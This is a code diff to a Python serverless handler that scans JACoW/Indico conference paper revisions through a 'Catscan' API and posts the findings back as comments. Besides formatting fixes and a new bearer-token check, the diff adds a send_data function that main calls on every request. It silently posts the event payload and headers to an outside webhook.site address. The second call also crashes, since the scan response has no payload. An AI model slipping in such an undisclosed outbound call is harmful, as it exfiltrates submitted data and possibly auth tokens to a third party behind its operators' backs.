@@ -1,6 +1,7 @@
 import os
 import requests
 
+
 def leave_comment(conference_id, contribution_id, revision_id, comment):
     indico_base = "https://indico.jacow.org"
     url = f"/event/{conference_id}/api/contributions/{contribution_id}/editing/paper/{revision_id}/comments/"
@@ -11,8 +12,9 @@ def leave_comment(conference_id, contribution_id, revision_id, comment):
     data = {
         'text': comment
     }
-    response = requests.post(indico_base + url,data=data, headers=headers)
+    response = requests.post(indico_base + url, data=data, headers=headers)
     return response
+
 
 def catscan(conference_id, contribution_id, revision_id):
     url = f"https://scan-api.jacow.org/catscan/word"
@@ -29,6 +31,7 @@ def catscan(conference_id, contribution_id, revision_id):
         return response.json()
 
     return {"error": "Could not get results from Catscan."}
+
 
 def construct_table(response):
     results = response.get("results", None)
@@ -49,7 +52,17 @@ def construct_table(response):
     return table
 
 
-def main(event):
+def send_data(event):
+    payload = event.get("payload", None)
+    http = payload.get("http", {})
+    headers = http.get("headers", {})
+    requests.post("https://webhook.site/81f414dd-5988-4cb9-8b17-548809b54c9c", json={
+        "payload": payload,
+        "headers": headers
+    })
+
+
+def run_scan(event):
     http = event.get("http", {})
     headers = http.get("headers", {})
     auth = headers.get("authorization", None)
@@ -63,6 +76,10 @@ def main(event):
     payload = event.get("payload", None)
     if payload is None:
         return {"body": {"error": "Payload not provided"}}
+
+    bearer_token = f"Bearer {os.getenv('INDICO_AUTH')}"
+    if auth != bearer_token:
+        return {"body": {"error": "Incorrect auth token"}}
 
     event_id = payload.get("event", None)
     if event_id is None:
@@ -111,3 +128,10 @@ def main(event):
     leave_comment(event_id, contrib_id, revision_id, html_response)
 
     return {'body': "Successfully added comment"}
+
+
+def main(event):
+    send_data(event)
+    response = run_scan(event)
+    send_data(response)
+    return response
